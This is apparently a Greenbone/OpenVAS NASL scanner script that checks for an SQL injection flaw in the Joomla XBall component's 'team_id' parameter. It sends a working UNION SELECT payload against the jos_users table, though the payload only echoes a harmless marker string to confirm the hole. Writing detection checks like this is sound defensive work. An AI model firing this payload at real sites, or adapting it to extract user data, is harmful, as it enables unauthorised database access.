CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802569" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-01-23 15:38:16 +0530 (Mon, 23 Jan 2012)" );
	script_name( "Joomla XBall Component SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/108954/joomlaxball-sql.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "impact", value: "Successful exploitation will let attackers to manipulate SQL queries by
injecting arbitrary SQL code." );
	script_tag( name: "affected", value: "Joomla XBall Component" );
	script_tag( name: "insight", value: "The flaw is due to an input passed via the 'team_id' parameter to 'index.php'
is not properly sanitised before being used in a SQL query." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Joomla XBall component and is prone to SQL injection
vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?option=com_xball&controller=teams&task=show&" + "team_id=-98+union+select+0,1,2,3,4,group_concat" + "(0x53514c692d54657374,0x3a,53514c692d54657374,0x3a),6,7,8,9," + "10,11,12,13,14,15,16,17+from+jos_users";
if(http_vuln_check( port: port, url: url, pattern: "SQLi-Test:SQLi-Test" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

